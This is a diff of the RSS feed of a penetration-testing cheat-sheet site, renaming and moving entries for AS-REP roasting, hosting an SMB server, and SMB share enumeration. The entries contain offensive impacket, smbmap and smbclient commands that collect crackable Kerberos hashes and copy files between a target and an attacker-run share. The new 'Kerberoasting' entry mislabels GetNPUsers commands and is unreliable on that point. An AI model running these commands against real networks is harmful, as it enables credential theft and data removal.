@@ -8,13 +8,6 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@windows/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>ASP</title>
-      <link>https://tldrbins.github.io/asp-roasting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/asp-roasting/</guid>
-      <description> ASP-Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 ASP-REP Vulnerable Users impacket-GetNPUsers &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 </description>
-    </item>
-    <item>
       <title>dotnet</title>
       <link>https://tldrbins.github.io/dotnet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -36,11 +29,25 @@
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
     </item>
     <item>
+      <title>Host a SMB Server</title>
+      <link>https://tldrbins.github.io/smb_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_server/</guid>
+      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
       <title>IIS</title>
       <link>https://tldrbins.github.io/iis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/iis/</guid>
       <description>IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/asp-roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/asp-roasting/</guid>
+      <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting impacket-GetNPUsers &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 </description>
     </item>
     <item>
       <title>Kerberos</title>
@@ -111,13 +118,6 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
       <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.</description>
-    </item>
-    <item>
-      <title>SMB Server</title>
-      <link>https://tldrbins.github.io/smb_server/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/smb_server/</guid>
-      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
     </item>
     <item>
       <title>Windows ACLs</title>
